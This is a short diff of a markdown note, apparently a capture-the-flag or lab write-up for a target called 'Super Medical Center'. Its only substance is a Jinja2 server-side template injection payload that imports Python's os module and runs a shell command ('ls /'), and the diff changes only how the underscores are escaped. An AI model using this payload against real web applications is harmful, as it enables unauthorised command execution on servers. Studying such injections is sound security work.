@@ -1,4 +1,4 @@
 # Super Medical Center (SMC)
 
 Payload:
-{{request.application.\__globals\__.\__builtins\__.\__import\__('os').popen('ls /').read()}}
+{{request.application.\_\_globals\_\_.\_\_builtins\_\_._\_import\_\_('os').popen('ls /').read()}}
